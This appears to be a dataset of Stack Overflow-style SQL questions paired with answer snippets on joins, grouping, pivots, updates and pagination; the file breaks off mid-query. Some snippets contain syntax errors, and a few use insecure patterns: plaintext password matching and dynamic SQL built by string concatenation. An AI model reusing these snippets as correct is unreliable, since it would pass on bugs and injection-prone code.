37928,53055,How to select only the rows that have a column with a repeated value?,"select t1.run, t1.code, t2.code from tablename t1, tablename t2
    where t1.run = t2.run and t1.code = 1 and t2.code = 8;
"
20593,48847,What should the column and length be for a column of this decimal,"decimal(20,14)
"
38755,6136,how to write a hql to get all records without permissions,"SELECT p
FROM Project p
WHERE p.id NOT IN
  (SELECT authorization.project.id
   FROM ProjectAuthorization authorization
   WHERE authorization.user = :currentUser)
"
14673,1126,SQL: How to use comma values to join another table?,"SELECT  a.id,a.username,
        GROUP_CONCAT(b.book_name ORDER BY b.id) like_books
FROM    A a
INNER JOIN B b ON FIND_IN_SET(b.id, a.like_books) > 0
GROUP   BY a.id
"
7351,1799,In SQL can a sequenced range selection be done more efficiently than my algorithm (see code) that uses a cursor?,"WITH tblRanges AS
( 
    SELECT 1 AS ID  UNION 
    SELECT 2 AS ID  UNION 
    SELECT 3 AS ID  UNION 
    SELECT 9 AS ID  UNION 
    SELECT 10 AS ID UNION 
    SELECT 11 AS ID UNION 
    SELECT 13 AS ID UNION 
    SELECT 15 AS ID UNION 
    SELECT 16 AS ID 
),
StartingPoints AS
(
SELECT ID, ROW_NUMBER() OVER(ORDER BY ID) AS rownum
FROM tblRanges AS A
WHERE NOT EXISTS
(SELECT *
FROM tblRanges AS B
WHERE B.ID = A.ID - 1)
),
EndingPoints AS
(
SELECT ID, ROW_NUMBER() OVER(ORDER BY ID) AS rownum
FROM tblRanges AS A
WHERE NOT EXISTS
(SELECT *
FROM tblRanges AS B
WHERE B.ID = A.ID + 1)
)
SELECT S.ID AS start_range, E.ID AS end_range
FROM StartingPoints AS S
JOIN EndingPoints AS E
ON E.rownum = S.rownum;
"
38293,60324,SQL Server Backup to a Remote Server,"BACKUP DATABASE [DB NAME] TO DISK [\\server\share\path]
"
1939,60073,Dynamic SQL for CASE Statements to remove hardcode,"declare @cases nvarchar(max) = '';

declare @l varchar(max) = @ATTRIBUTE_LIST + ',';
declare @ofs int = 0;
declare @pos int = charindex(',', @l, @ofs + 1);

while @pos > 0
begin
    if @cases <> '' set @cases = @cases + ',';
    set @cases = @cases +
            replace('
       CASE WHEN (GROUPING(<COL>) = 1) THEN ''ALL''
           ELSE ISNULL(<COL>, '''')
       END AS <COL>',
           '<COL>', substring(@l, @ofs + 1, @pos - @ofs - 1)
    ); 
    set @ofs = @pos;
    set @pos = charindex(',', @l, @ofs + 1);
end
select @cases;
"
8526,60668,How use JpaRepository Query for select sorted records starting from :start and number of :count,"public interface ItTougaoRepository extends JpaRepository<ItTougao, Long>, PagingAndSortingRepository<ItTougao, Long>{
    public Page<ItTougao> findByAcceptedFalseOrderByCreateDateDesc(Pageable pageable);
    public Page<ItTougao> findByAcceptedTrue(Pageable pageable);
    public Page<ItTougao> findByAcceptedTrueOrderByAcceptDateDesc(Pageable pageable);
}
"
35164,54063,`string_agg` in postgresql maximum length,"select left(string_agg(name, ','), N) as FirstN
"
39526,64783,need absent and present count with month name,"SELECT   MONTHNAME(attendance_date) AS `Month_Name`, 
         COUNT(CASE WHEN STATUS ='A' THEN 1 END) AS absent_count,
         COUNT(CASE WHEN STATUS ='P' THEN 1 END) AS present_count,
FROM     attendance
WHERE    sid = '2' AND campus_id = 2
GROUP BY MONTHNAME(attendance_date);
"
19420,8731,how to return total sold p / year for several years in columnar format?,"select o.AcctNo, a.Name,
       Sum(case when year(PurchaseDate) = 2015 then TotSold else 0 end) as tot_2015,
       Sum(case when year(PurchaseDate) = 2014 then TotSold else 0 end) as tot_2014
from Orders o Join
     Accounts a
     on a.AcctNo = o.AcctNo
where PurchaseDate >= '2014-01-01' 
      PurchaseDate < '2016-01-01' 
Group by o.AcctNo, a.Name ;
"
14535,11131,SQL query with sum and unique output,"SELECT
  CASE
    WHEN COUNT(DISTINCT class) > 1 THEN '(multiple)'
    ELSE MAX(class)
  END AS class
, color
, fruit
, SUM(rating) AS sum
FROM MyTable
GROUP BY color,fruit
"
7709,10287,Can this be done in SQL 2008?,"SET NOCOUNT ON

DECLARE @Feedback Table 
(
SummaryId INT,
Q01 INT,	Q02	INT,	Q03	INT,	Q04	INT,	Q05	INT,
Q06 INT,	Q07	INT,	Q08	INT,	Q09	INT,	Q10	INT,
Q11 INT,	Q12	INT,	Q13	INT,	Q14	INT,	Q15	INT
)

INSERT INTO @Feedback Values (25, 1, 2, 3, 4, 5, 6, 7, 6, 5, 4, 3, 2, 1, 2, 3)
INSERT INTO @Feedback Values (25, 1, 2, 3, 4, 5, 6, 7, 6, 5, 4, 3, 2, 1, 2, 3)
INSERT INTO @Feedback Values (25, 1, 2, 3, 4, 5, 6, 7, 6, 5, 4, 3, 2, 1, 2, 3)

;WITH ReOrderedData AS
(
SELECT SummaryId, QuestionNum, Score, COUNT (*) as NumScores FROM
(
    SELECT SummaryId, Q01, Q02, Q03, Q04, Q05, Q06, Q07, Q08, Q09, Q10, Q11, Q12, Q13, Q14, Q15
    FROM @Feedback
) p
UNPIVOT (Score For QuestionNum IN (Q01, Q02, Q03, Q04, Q05, Q06, Q07, Q08, Q09, Q10, Q11, Q12, Q13, Q14, Q15)) as UnPvt
GROUP BY SummaryId, QuestionNum, Score)
SELECT QuestionNum, 
    IsNull ([0], '') [0], IsNull ([1], '') [1], IsNull ([2], '') [2], IsNull ([3], '') [3], 
    IsNull ([4], '') [4], IsNull ([5], '') [5], IsNull ([6], '') [6], IsNull ([7], '') [7]
FROM (
SELECT QuestionNum, Score, NumScores
FROM ReOrderedData
) As SourceTable
PIVOT
(
Max (NumScores) For Score IN ([0], [1], [2], [3], [4], [5], [6], [7])
) As Pivotx
"
34155,58447,SELECT COUNT (*) returning -1,"int homes = (int)numberOfHomes.ExecuteScalar();
"
13941,55476,Updating multiple field in same table with different WHERE condition,"UPDATE members 
SET 
   last_game = CASE WHEN userid = 1 THEN $time ELSE last_game END,
   game_played = game_played + 1 
WHERE userid > 0
"
12674,47265,Efficiently fetching 25 rows with highest sum of two columns (MySQL),"select ur1.*
from (select u.*
      from users u
      order by rank1 desc
      limit 1000
     ) ur1 join
     (select u.*
      from users u
      order by rank2 desc
      limit 1000
     ) ur2
     on ur1.username = ur2.username
order by ur1.rank1 + ur1.rank2 desc
limit 25;
"
15057,20977,sql query select statement,"select name, role from manager m inner join login l on l.manager_id = m.manager_id where username=""gmJohn"" and password=""abc"";
"
39725,65509,MySQL Query Optimisation,"SELECT * 
FROM (SELECT * 
    FROM tbl_products
    WHERE p_live = 'y'
    ORDER BY p_title_clean ASC, p_title ASC
    LIMIT 0 , 10
) AS tbl_products
LEFT JOIN tbl_link_products_categories
    ON lpc_p_id = p_id
LEFT JOIN tbl_link_products_brands
    ON lpb_p_id = p_id
LEFT JOIN tbl_link_products_authors
    ON lpa_p_id = p_id
LEFT JOIN tbl_link_products_narrators
    ON lpn_p_id = p_id
LEFT JOIN tbl_linkfiles
    ON lf_id = p_id
    AND (
        lf_table = 'tbl_products'
        OR lf_table IS NULL
    )
LEFT JOIN tbl_files
    ON lf_file_id = file_id
    AND (
        file_nameid = 'p_main_image_'
        OR file_nameid IS NULL
    )
"
28484,69232,Update multiple rows from group by SQL,"UPDATE t
   SET bdate = GETDATE()
  FROM table1 t LEFT JOIN 
(
  SELECT id, MAX(bdate) bdate
    FROM table1
   GROUP BY id
) e
    ON t.id = e.id
   AND t.bdate = e.bdate
 WHERE e.id IS NULL;
"
6477,42968,Pl/Sql using instr to find exact match,"select replace(name,' serv ', ' Services ')
from names;
"
16068,15808,"SQL - Update to table, no index","UPDATE t
SET t.[e-mail] = t2.[e-mail]
from [vdb].[dbo].[FACT_Sales] t
inner join DIM_Staff t2
on t.Name = t2.Name
"
21615,6837,Query to use GROUP BY multiple columns,"SELECT
    ContPat,
    ContResp,
    ContIns,
    MONTH(ContDue) as Mo,
    YEAR(ContDue) as Yr,
    COUNT(*) as 'Records'
FROM
    MyTable
GROUP BY
    ContPat,
    ContResp,
    ContIns,
    MONTH(ContDue),
    YEAR(ContDue)
HAVING
    COUNT(*) > 1
"
628,74727,Calculate Average Time Over 24 hour period,"SELECT job_name,
    case when avg_end_time_in_minutes  > 60*24 then avg_end_time_in_minutes - 60*24 
         else avg_end_time_in_minutes end as avg_adjusted,
case when max_end_time_in_minutes  > 60*24 then max_end_time_in_minutes - 60*24 
     else max_end_time_in_minutes end as max_adjusted,
CAST((CAST(avg_adjusted / 60  AS INTEGER) (FORMAT '9(2)')) AS CHAR(2))||':'||
CAST((CAST((avg_adjusted / 60 MOD 1)*60  AS INTEGER) (FORMAT '9(2)')) AS CHAR(2)) 
                        avg_adjusted_time,
CAST((CAST(max_adjusted / 60  AS INTEGER) (FORMAT '9(2)')) AS CHAR(2))||':'||
CAST((CAST((max_adjusted / 60 MOD 1)*60  AS INTEGER) (FORMAT '9(2)')) AS CHAR(2)) 
                           max_adjusted_time
FROM (
SELECT job_name,
    AVG(end_time_in_minutes) avg_end_time_in_minutes,
    MAX(CAST(end_time_in_minutes AS DECIMAL(8,2))) max_end_time_in_minutes
FROM (
SELECT job_name,
    CAST(substr(end_time, 1, 2) AS INTEGER)*60
        + CAST(substr(end_time, 4, 2) AS INTEGER) 
        + cast(end_date - start_date as integer)*60*24 AS end_time_in_minutes
FROM dabank_prod_ops_tb.bdw_tables_load_tracker_view a          
WHERE a.status = 'COMPLETED' 
AND a.start_date BETWEEN CURRENT_DATE - 31 AND CURRENT_DATE -1
AND a.end_time IS NOT NULL
) a
GROUP BY 1
) b
"
21198,27664,SQL Server : selecting TOP Records and updating results in another table,"Select
   U.User, Max(L.LogOnDate)
   From Users U
   Join Login L On L.User = U.User
"
29140,40825,Grouping dates by month in an sql server query (stored procedure),"WITH    (
        SELECT  0
        UNION ALL
        SELECT  m + 1
        FROM    mon
        WHERE   m < 11
        ),
        yr (y) AS
        (
        SELECT  CAST('1990-01-01' AS DATETIME)
        UNION ALL
        SELECT  DATEADD(year, 1, y)
        FROM    yr
        WHERE   y <= GETDATE()
        ),
        dates (smy, emy) AS
        (
        SELECT  DATEADD(month, m, y), DATEADD(month, m + 1, y)
        FROM    yr
        CROSS JOIN
                mon
        ),
        diffs (smy, emy, days) AS
        (
        SELECT  smy, emy, DATEDIFF(day, smy, emy)
        FROM    dates
        )
SELECT  smy,
        roomId,
        CAST(SUM(DATEDIFF(day,
        CASE WHEN start_date < smy THEN smy ELSE start_date END,
        CASE WHEN end_date > emy THEN emy ELSE end_date END
        )) AS FLOAT) / days
FROM    diffs
JOIN    bookings
ON      start_date < emy
        AND end_date >= smy
GROUP BY
        roomId, smy, emy, days
"
24368,37131,Subquery in Inner join - Multi-part identifer could not be bound,"SELECT t1.*
FROM dbo.Table1 t1 (nolock) CROSS APPLY
     (SELECT TOP 1 t2_s.c1, t2_s.c2, t2_s.c4
      FROM dbo.Table2 t2_s
      WHERE t2_s.c1 = t1.c1
      ORDER BY t2_s.dateStamped DESC
     ) t2 INNER JOIN
     dbo.Table3 t3
     on t3.c1 = t2.c2 and t3.c2 = 1
WHERE t1.c2 = 'xxx';
"
13814,53712,Can I check for constraints before a delete in SQL Server?,"If Exists ( Select * From OtherTable
            Where OtherTableFKColumn = MainTablePrimaryKey) 
   Begin
       Rollback Transaction
       RaisError('Violating FK Constraint in Table [OtherTable]', 16, 1)
   End
"
21046,73201,update mysql table column of timestamp without changing any field,"UPDATE table_name 
SET last_delv_date = CURRENT_TIMESTAMP
WHERE ... ;
"
35902,37155,Personal and Global messaging database design,"      |r_id| m_id | recipient_id|  status | deleted |
      | 50 | 100  |  02         |  read   |  no     |
      | 51 | 200  |  01         |  unread |  no     |
      | 52 | 300  |  01         |  read   |  yes    |
      | 53 | 300  |  02         |  unread |  no     | 
"
23441,38853,SQL sum and link fields in multiple tables,"SELECT table1.plantID, table1.ItemName, SUM(table1.qty), COALESCE(t2.num_sum, 0), COALESCE(t3.qty_sum, 0)
FROM table1
LEFT JOIN (SELECT plantid, itemname, SUM(num) AS num_sum
      FROM table2
      WHERE wk >= 41 AND wk <= 45
      GROUP BY plantID, itemname) t2 ON table1.plantID = t2.plantID AND table1.ItemName = t2.ItemName
LEFT JOIN (SELECT plantid, itemname, SUM(qty) AS qty_sum
      FROM table3
      WHERE table3_wk >= 41 AND table3_wk <= 45
      GROUP BY plantID, itemname) t3 ON table1.plantID = t3.plantID AND table1.ItemName = t3.ItemName
WHERE table1.plantid = 1
GROUP BY plantID, ItemName
"
35320,47309,How to overload a method in an object type,"create type my_object as object (hp number,
  MAP MEMBER FUNCTION engine_power RETURN FLOAT,
  MEMBER FUNCTION engine_power RETURN INTEGER
);
/

Type MY_OBJECT compiled

create type body my_object as
  MAP MEMBER FUNCTION engine_power
  RETURN FLOAT IS
    v_kw FLOAT := 0.745699872;
  BEGIN
    RETURN hp * v_kw;
  END;

  MEMBER FUNCTION engine_power
  RETURN INTEGER IS
    v_kw FLOAT := 0.745699872;
  BEGIN
    RETURN TRUNC(hp * v_kw);
  END;
end;
/

Type body MY_OBJECT compiled
"
14865,12115,SQL order by DATE DESC + group on other Collumn,"select t.*
from table t join
     (select project, max(date) as maxd
      from table
      group by project
     ) tt
     on t.project = tt.project
order by tt.maxd desc, tt.project, t.date desc;
"
1790,1964,Converting SQL query to Codeigniter Active Record,"$this->db->select('*');
$this->db->from('adm_species t');
$this->db->join('adm_breeds e', 'e.species_id = t.id');
$this->db->join('fd_registrations s', 's.breeds_id = e.id');
$this->db->where('t.code', 'cat');
$this->db->where('s.sex_id', 2);
$this->db->like('s.ownername', 'sha', 'both'); 
$query = $this->db->get();
"
28383,14759,Deduplication by two columns,"    update temp1 set temp1.fix='' 
    from people temp1 inner join people  temp2 
    on temp1.fix=temp2.fix where temp1.id>temp2.id
"
27609,64516,Comparing 2 items but using a value from found item,"select <fields that you want>
from ((select <list of fields from domestic>, itemid as lookupitem
       from domestic d
      ) union all
      (select <list of most fields from import>, replace(itemid, '-h', '') as lookupitem
       from import i
      )
     ) f left join
     lookup lu
     on f.lookupitemid = lu.itemid
"
23609,42798,Unable to restrict results in SQL correctly becaue dont know all details when create Join,"SELECT
t1.name,t1.id,t3.id,t5.name,t7.title
FROM discogs.artist_extra2 t1
INNER JOIN
(
SELECT DISTINCT
name
FROM musicbrainz.artist
GROUP BY name
HAVING COUNT(*)>1
) AS T2
ON t1.name=t2.name
INNER JOIN musicbrainz.artist t3
ON t2.name=t3.name
INNER JOIN discogs.releases_artists t6
ON t1.id=t6.artist_id
INNER JOIN musicbrainz.artist_credit t4
on t3.name=t4.name
INNER JOIN musicbrainz.artist_credit_name t8
on t4.id=t8.artist_credit
INNER JOIN musicbrainz.release t5
on t4.id=t5.artist_credit
AND t3.id=t8.artist
INNER JOIN discogs.release t7
ON t5.name=t7.title
AND t6.release_id=t7.id
;
"
13253,43222,MySQL AND OR Statement,"SELECT * 
FROM users
WHERE username =  'bob'
AND
( 
  device_1 =  'test'
  OR device_2 =  'test'
  OR device_3 =  'test'
) 
"
16564,53351,Select columns from two different table with different fields in one query Access database,"SELECT Discount , Price
FROM tbl_Discount, tbl_Tariff
WHERE d_ID = ? AND p_ID = ?
"
37376,28423,is it possible to use ORDER BY column not in the GROUP BY?,"order by min([date_in])
"
34741,15698,select distinct rows order by Id Asc,"SELECT Title, min(Id) as minid
FROM Package 
WHERE Type='Group'
GROUP BY Title
ORDER BY min(Id) ASC
"
2530,38054,t-sql return number of unique values in row,"Declare
  @keyword nvarchar(20) = N'keyword',
  @domannamn nvarchar(20) = N'C'

Select
  r.ranking_position,
  r.ranking_date,
  d.doman_name,
  Count(r.ranking_id_doman) Over (Partition By r.ranking_date)
From
  dbo.t_ranking r
    inner join
  dbo.t_doman d
    on r.ranking_id_doman = d.doman_id
Where
  ranking_keyword = @keyword And
  ranking_date Between DateAdd(day, -30, GetDate()) And GetDate() And
  d.doman_name like @domannamn + '%'
Order By
  2, 1
"
5946,23372,Query automatically excluding records with no entries,"SELECT v.vname, count(ok)/count(distinct o.pk) AS avg 
FROM v
left join o on o.pk = p.pk
inner join p on p.vk = v.vk
group v.vname
"
10711,65759,Update table on matching text type of data,"UPDATE  t1 
SET t1.townid=t2.townid
FROM table1 t1 
JOIN table2 t2 ON t1.town=t2.town
"
14713,1248,Call a method when back button pressed,"@Override
protected void onResume()
{
  refreshListMethod();
  super.onResume();
}
"
23403,33396,mysql query to get data corresponding to duplicate records,"SELECT id, Roll, GROUP_CONCAT(Rank), GROUP_CONCAT(Grade)
FROM your_table
GROUP BY Roll
HAVING COUNT(*) > 1
"
8145,28517,Need to add where clause to a table adapter,"Dim cmd As New SqlCommand(""SELECT * FROM Students WHERE ID=@ID"", myConnection)
cmd.Parameters.AddWithValue(""@ID"", 5)
Me.StudentsTableAdapter.SelectCommand = cmd
Me.StudentsTableAdapter.Fill(Me.StudentsDataSet.Students)
"
28516,50832,Query message between two parties but hide message to the user who deleted,"SELECT m.sender_id, m.recipient_id, m.Body, u_sender.Name as Sender,
       u_recipient.Name as Recipient, sender_deleted, recipient_deleted
FROM messages m
JOIN recipient r ON (m.m_id=r.m_id)
JOIN user u_sender ON (m.sender_id=u_sender.u_id)
JOIN user u_recipient ON (r.recipient_id=u_recipient.u_id)
WHERE 
     m.sender_id IN (01,02) 
 AND 
     r.recipient_id ON (01,02)
 AND
     ((m.sender_id=<id> AND m.sender_deleted='no') 
       OR 
     (r.recipient_id=<id> AND r.recipient_deleted='no'))
"
2186,25547,Oracle 11g: only return a value if row is first or last in group,"select
  case when ROW_NUMBER = 1 then GROUP_ID
       when ROW_NUMBER = GROUP_COUNT then 'last'
       else NULL
  end GROUP_ID
  ,COUNT_1
  ,COUNT_2
from(
    select
      GROUP_ID
      ,COUNT_1
      ,COUNT_2
      ,row_number() over(partition by GROUP_ID) ROWNUMBER
      ,count(GROUP_ID) over (partition by GROUP_ID) GROUP_COUNT
    from
      FOO
)
"
33937,37842,SQL Select list of last records with condition,"SELECT
right(
max(
right(('0000000' + CONVERT(varchar,id) + '-'+ convert(varchar,codsituation)),4)),10),
name
FROM TABLE_NAME
GROUP BY name
HAVING 
right(
max(
right(

  ('0000000' + CONVERT(varchar,id) + '-'+ convert(varchar,codsituation))
  ,4)),1) = 2
"
8369,72477,script table as CREATE TO by using vb.net,"// Define your database and table you want to script out
string dbName = ""YourDatabase"";
string tableName = ""YourTable"";

// set up the SMO server objects - I'm using ""integrated security"" here for simplicity
Server srv = new Server();
srv.ConnectionContext.LoginSecure = true;
srv.ConnectionContext.ServerInstance = ""YourSQLServerInstance"";

// get the database in question
Database db = new Database();
db = srv.Databases[dbName];

StringBuilder sb = new StringBuilder();

// define the scripting options - what options to include or not
ScriptingOptions options = new ScriptingOptions();
options.ClusteredIndexes = true;
options.Default = true;
options.DriAll = true;
options.Indexes = true;
options.IncludeHeaders = true;

// script out the table's creation 
Table tbl = db.Tables[tableName];

StringCollection coll = tbl.Script(options);

foreach (string str in coll)
{
    sb.Append(str);
    sb.Append(Environment.NewLine);
}

// you can get the string that makes up the CREATE script here
// do with this CREATE script whatever you like!
string createScript = sb.ToString();
"
32496,11623,Why do Select Statement returns a row though the parameter in Where Clause didn't match any records?,"SELECT ID, Username, Password, FormalName
FROM tblUsers
WHERE (Username = [Username]) AND (Password = [Password])
"
5796,18689,Divide one column into multiple in a new table,"INSERT INTO newData(regID, pName, occupation) 
select  regID,
        max(case when filedid=14 then fieldDate end) as pName,
        max(case when filedid=15 then fieldDate end) as occupation,
        .....
from fieldData
group by regID
"
3117,40704,How to update a group of rows by a criteria of one row in the same table,"update yt
set status = 1
where exists (select name
              from yt t1
              where status = 1
                 and yt.name = t1.name);
"
30414,70793,SQL Server 2005 Using CHARINDEX() To split a string,"with t as (select 'LD-23DSP-1430' as val)
select t.*,
       LEFT(val, charindex('-', val) - 1),
   SUBSTRING(val, charindex('-', val)+1, len(val) - CHARINDEX('-', reverse(val)) - charindex('-', val)),
       REVERSE(LEFT(reverse(val), charindex('-', reverse(val)) - 1))
from t;
"
30680,7311,limit and offset on joined table,"SELECT  c.* ,f.Amount, f.Item FROM item_table f
   LEFT JOIN (
   SELECT * FROM category c 
   ORDER BY c.id desc
   LIMIT '.$offset.', 3
   )
 AS c ON f.cat_id = c.id
 ORDER BY c.id desc
"
29065,19992,find maximum without aggregate function,"SELECT age
FROM Owner o1
WHERE NOT EXISTS (SELECT 1 FROM Owner o2 WHERE o2.age > o1.age)
"
12166,32342,Join votes table and sum all votes,"SELECT
    `quotes`.`id` as `ID`,
    `quote`.`quote` as `quote`,
    SUM(`votes`.`vote`) AS `vote`
FROM  `quotes`
    LEFT JOIN `votes`
        ON `quotes`.`id` = `votes`.`quote`
GROUP BY `quotes`.`id`
"
12798,62154,Need to order MySQL table and return specific subset,"select foo
from bar
order by baz
limit 0,10;
"
7880,33482,Tune the PLSQL limit parameter in bulk update,"UPDATE table_user_backup tub
   SET (sirname, sirname_date) = (SELECT sirname, sysdate
                                    FROM table_user tu
                                   WHERE tu.id = tub.id)
 WHERE EXISTS( SELECT 1
                 FROM table_user
                WHERE tu.id = tub.id);
"
7617,71897,Need to count unique observations for three variables taken together,"proc sql noprint;

    create table new_table as
    select distinct count(tract) as COUNT_t
    from metro1_00
    group by tract, county, state
    ;
quit;
"
7920,73981,Conditional WHERE-clause at stored procedures,"AND (LW.""testVal"" LIKE :testVal OR :testVal = '*')
"
38498,13702,Various columns in SQL,"SELECT
Country
,SUM(CASE WHEN Company IS NULL THEN 1 ELSE 0 END) Normal_Customer
,SUM(CASE WHEN Company IS NOT NULL THEN 1 ELSE 0 END) Corporate_Customer
FROM Customer
GROUP BY Country
"
9303,66918,"What is the scope of using SQL Server's ""set transaction isolation level read uncommitted""","SELECT Column1 FROM Table1 WITH (READUNCOMMITTED) 
"
32814,8438,Remove duplicate rows based on one column,"SELECT Agenzia, Codice, Descrizione, FlBSP, MastroForn, CapocForn, ContoForn,
       SottocForn, CodIVANazAtt, CommNazAttiva, CommIntAttiva, FlCancellato, DataUltModifica,
       IDUtente, IDTerminale, CodAnagrafico, NoteDirPortAnd, NoteDirPortRit, ImpDirPortPax,
       ImpDirPortVei, GGScad, PathCondGen
FROM
 ( SELECT *,
      ROW_NUMBER()
      OVER (PARTITION BY Codice
            ORDER BY priorty ) AS rn
   FROM
    (

      SELECT    1 AS priority, 'Gabbiano' AS Agenzia, Codice, Descrizione, FlBSP, MastroForn, CapocForn, ContoForn,
                SottocForn, CodIVANazAtt, CommNazAttiva, CommIntAttiva, FlCancellato, DataUltModifica,
                IDUtente, IDTerminale, CodAnagrafico, NoteDirPortAnd, NoteDirPortRit, ImpDirPortPax,
                ImpDirPortVei, GGScad, PathCondGen
      FROM dbo.TVTV0000
      UNION ALL -- probably more efficient than UNION
      SELECT    2 AS priority, 'Istantravel' AS Agenzia, Codice, Descrizione, FlBSP, MastroForn, CapocForn, ContoForn,
                SottocForn, CodIVANazAtt, CommNazAttiva, CommIntAttiva, FlCancellato, DataUltModifica,
                IDUtente, IDTerminale, CodAnagrafico, NoteDirPortAnd, NoteDirPortRit, ImpDirPortPax,
                ImpDirPortVei, GGScad, PathCondGen
      FROM IstanTravel.dbo.TVTV0000 AS Statistiche_1
      UNION ALL
      SELECT     3 AS priority, 'Globmaster' AS Agenzia, Codice, Descrizione, FlBSP, MastroForn, CapocForn, ContoForn,
                SottocForn, CodIVANazAtt, CommNazAttiva, CommIntAttiva, FlCancellato, DataUltModifica,
                IDUtente, IDTerminale, CodAnagrafico, NoteDirPortAnd, NoteDirPortRit, ImpDirPortPax,
                ImpDirPortVei, GGScad, PathCondGen
      FROM Globmaster.dbo.TVTV0000 AS Statistiche_2
    ) AS dt
 ) AS dt
WHERE rn = 1
"
30525,25373,Join Query and fetch on the basis of parameter not working," DECLARE @ProductId = 1 --a random Productid

  SELECT
       LicenceTypesId AS 'id',
       LicenceTypesName AS 'descr'
  FROM 
      tbProduct P INNER JOIN tbLicenceTypes LT 
      ON P.LicenceType = LT.LicenceTypesId          
  WHERE 
      P.Product = @ProductId
"
32621,235,SQL query for aggregate on multiple rows,"SELECT Name
FROM Tablename
WHERE indicator IN(1, 2)
GROUP BY Name
HAVING COUNT(DISTINCT indicator) = 2;
"
35120,34224,What would be a sql query to remove \n\r from the text?,"CREATE TABLE table1(column1 TEXT);
INSERT INTO table1 VALUES ('text1\r\ntext2
text3');

SELECT * FROM table1;
--------
text1
text2
text3

UPDATE table1 SET column1 = REPLACE(column1, '\r\n', '');
SELECT * FROM table1;
--------
text1text2text3
"
30020,10906,Need some support writing a MySQL-Query,"SELECT
    m.id, m.sender_id, m.subject,
    r.receiver_id AS recipient,
    c.receiver_id AS carboncopy
FROM messages AS m
INNER JOIN message_receivers AS r
    ON m.id = r.message_id
LEFT OUTER JOIN message_receivers AS c
    ON r.message_id = c.message_id AND r.receiver_id != c.receiver_id
WHERE m.sender_id = x AND r.receiver_id = y
"
35039,28473,sql: how to add int records of one table into another?,"update T
set T.sum_column = T.sum_column + V.tempory
from TableA T
inner join ViewA V on T.id = V.id
"
20734,36703,How to show as column to recursive rows in a table With SQL Server,"SELECT patientId,[code1],[code2]
FROM  (SELECT *,
              'code'+ CONVERT(VARCHAR(20), Row_number() OVER(partition BY patientId ORDER BY (select null) )) piv_col
       FROM   Tablename) a
      PIVOT (Max(Code)
            FOR piv_col IN ([code1],
                            [code2])) piv 
"
18485,60903,SQL query for data extraction from two tables,"SELECT
    t.team_Name,
    p1.name + ' ' + p1.surname AS '1st_player_name',
    p2.name + ' ' + p2.surname AS '2nd_player_name'
FROM
    team t
INNER JOIN 
    player p1 ON t.player1_id = p1.id
INNER JOIN 
    player p2 ON t.player2_id = p2.id
"
32384,26227,Aggregation and Total,";
WITH    agg1
            AS (
                SELECT  region,
                        flag,
                        name,
                        COUNT(id) AS 'CountWithFlag'
                FROM    [dbo].[t2]
                GROUP BY region,
                        flag,
                        name
                ),
        agg2
            AS (
                SELECT  [name],
                        COUNT(id) AS CountByName
                FROM    [dbo].[t2]
                GROUP BY [name]
                )
    SELECT  [agg1].[region],
            [agg1].[flag],
            [agg1].[name],
            [agg1].[CountWithFlag],
            [agg2].[CountByName]
    FROM    [agg1]
            INNER JOIN [agg2]
                ON [agg2].[name] = [agg1].[name]
"
22006,5639,Can SQL use calculate values as alias names,"DECLARE @var table(rownum int, rowkey varchar(60), ALIAS varchar(80))
INSERT INTO @var SELECT row_number() over (ORDER BY employeeName), employeeName, cast(getdate() AS varchar(12))+employeeName FROM Table1
DECLARE @query varchar(500)
DECLARE @rowkey varchar(60), @i int, @max int
SET @i = 1
SET @max = (SELECT count(*) FROM @var)
SET @query = ''
WHILE @i <= @max
BEGIN
    SET @rowkey = (SELECT rowkey FROM @var WHERE rownum = @i)
    SET @query = 'select employeeName as ""'+(SELECT ALIAS FROM @var WHERE rowkey = @rowkey)+'"" from Table1 where employeeName = '''+@rowkey+''';'
    exec(@query)
    SET @i = @i + 1
END;
"
30131,53119,Get two types of value in the same column SQL,"if (
    not exists 
    (select 1 from MyTable where isnull(ALINUT_Value,0) <> 0)
    )
begin
    print 'ok'
end
"
15833,4494,SQL get single value inside existing query?,"DECLARE @NumberOfRows INT

SELECT @NumberOfRows = Count(* ) FROM   user_details
 WITH messageentries
      AS (SELECT   Row_number()
                  OVER(ORDER BY score DESC) AS row,
                Count(DISTINCT town.townid) AS towns,
                user_details.username,
                user_score.score,
                allience.alliencename,
                allience.allienceid,
                allience.alliencetagname,
                @NumberOfRows AS numberofrows
       FROM     user_details
                INNER JOIN user_score
                  ON user_details.username = user_score.username
                INNER JOIN town
                  ON user_details.username = town.townownername
                LEFT OUTER JOIN allience_roles
                  ON user_details.useralliencerole = allience_roles.roleid
                LEFT OUTER JOIN allience
                  ON allience_roles.allienceid = allience.allienceid
       GROUP BY user_details.username,
                user_score.score,
                allience.alliencename,
                allience.allienceid,
                allience.alliencetagname)
 SELECT *, MyRowNumber.row AS myself
 FROM   messageentries,
    	(SELECT row FROM messageentries WHERE username = 'myUsername') MyRowNumber
 WHERE  row BETWEEN @startRowIndex AND @StartRowIndex + @RowsPerPage - 1
"
563,27793,MySQL REGEXP not ignoring hyphens,"Email REGEXP '[^A-Za-z0-9@.+_-]'
"
33342,65171,How do I use group by on one column which is having many entries?,"SELECT name,SUM(price) as price
FROM table 
GROUP BY name
HAVING SUM(price) = 0
"
20541,46352,sql select if they have more than once,"SELECT A.name, B.color, count(*) 'color count' 
FROM Names A JOIN Colors B on A.id = B.id
GROUP BY A.id, B.color
HAVING Count(*)>1
"
32665,4267,Query that finds all locations within a certain radius of a given coordinate,"WHERE (6371 * 2 * 
ATAN2(
  SQRT(
    SIN(RADIANS((lat-53.6771)/2)) * SIN(RADIANS((lat-53.6771)/2)) + SIN(RADIANS((lon+1.62958)/2)) * SIN(RADIANS((lon+1.62958)/2)) * COS(RADIANS(lat)) * COS(RADIANS(53.6771))
  ),
  SQRT(
    1-(SIN(RADIANS((lat-53.6771)/2)) * SIN(RADIANS((lat-53.6771)/2)) + SIN(RADIANS((lon+1.62958)/2)) * SIN(RADIANS((lon+1.62958)/2)) * COS(RADIANS(lat)) * COS(RADIANS(53.6771)))
  )
)) < 800
"
5117,69157,how to exchange values of same column in same table,"UPDATE MyTable
SET Status = (CASE WHEN Status = 'Married' THEN 'Single' ELSE 'Married' END )
"
11432,62793,Upgrading Postgres on Heroku from 9.2 to 9.3?,"heroku addons:add pgbackups
heroku pgbackups:capture
heroku addons:add heroku-postgresql:plan_here
heroku pgbackups:restore...
"
21882,21707,SQL: Matching whole string unsorted,"SELECT First_Name
FROM   PEOPLE A
       JOIN dbo.Split(@FULL_NAME, ',') B
         ON A.First_Name + ' ' + A.Last_Name LIKE '%' + B.strval + '%'
GROUP  BY first_name
HAVING Count (*) = (SELECT Count(*)
